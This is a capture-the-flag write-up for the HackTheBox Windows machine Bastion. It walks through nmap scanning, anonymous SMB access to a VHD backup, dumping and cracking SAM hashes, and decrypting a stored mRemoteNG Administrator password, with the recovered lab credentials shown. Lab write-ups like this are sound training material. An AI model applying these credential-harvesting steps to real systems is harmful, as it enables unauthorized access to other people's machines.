---
title: HTB · Bastion
slug: htb-bastion
date: 2026-08-18
image: bastion
platform: HackTheBox
os: Windows
difficulty: Easy
points: 450
tags: [hackthebox, windows, easy, retired, smbclient, vhd, mremoteng]
description: Bastion is an easy-rated Windows machine on Hack The Box that centers on enumerating an exposed SMB share containing a Windows VHD backup file, which can be mounted to extract SAM/SYSTEM hives and dump local password hashes. Privilege escalation then comes from recovering stored credentials in the mRemoteNG configuration, leading to full administrative access.
featured: true
---

# Reconnaissance

## Staged Nmap Scanning
````bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.65.109 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

nmap -p$ports -sC -sV -T4 10.129.65.109
````
### Initial Scan Results
```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -40m20s, deviation: 1h09m14s, median: -22s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-17T15:54:55+02:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-08-17T13:54:53
|_  start_date: 2026-08-17T13:47:16
```

---
## SMB - TCP 445
Let's first check the shares.
```bash
smbclient -N -L //10.129.65.109
```
There is a share called Backups
Let's check it's contents.
```bash
smbclient -N //10.129.65.109/Backups
```
Among other files we find a VHD file in `\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\`.
VHD files are backups of the filesystem of Physical or Virtual machines. The files are too big so I'll switch to my windows machine to browse them remotely. 
We can open the large file with 7-Zip.

The SAM ( Security Account Manager ) file on Windows is used as a database to store the hashes
for the users on Windows. We can extract hashes from it and attempt to crack them
To crack the DB we need the SAM and SYSTEM hives. They are located at
C:\WIndows\System32\config\SAM and C:\Windows\System32\config\SYSTEM. And we can copy those 2 files to our local system. Once it’s copied I transferred the files to Linux and now we can crack them using samdump2.

---
# Shell as l4mpje
```
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

*disabled*
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

We can try and crack the L4mpje user's hash using [crackstation]().
And it was a success:

| 26112010952d963c8dc4217daec986d9 | NTLM | bureaulampje |
| -------------------------------- | ---- | ------------ |
Now let's try to ssh with these credentials.
```bash
ssh l4mpje@10.129.65.109
```
We can find the flag on Desktop
```powershell
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
```

---
# Privilege Escalation
Let’s enumerate the installed programs on the box.
We find [mRemoteNG](https://github.com/mRemoteNG/mRemoteNG) to be installed, looking at the changelog.txt we that the version is **1.76.11**.
mRemoteNG is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user’s AppData directory, `confCons.xml`, that holds that information:
```powershell
PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> type confCons.xml
```
After looking at that file i found an encrypted password for Administrator.
```
Username="Administrator" Domain="" 
Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```
We can use this [script](https://github.com/kmahyyg/mremoteng-decrypt) for decoding it.
And after running the script we got a password.
```python
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==


Password: thXLHM96BeKL0ER2
```
Let's try to ssh.
```bash
ssh Administrator@10.129.65.109
```
And then we can find the root flag on the Desktop
```powershell
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
```
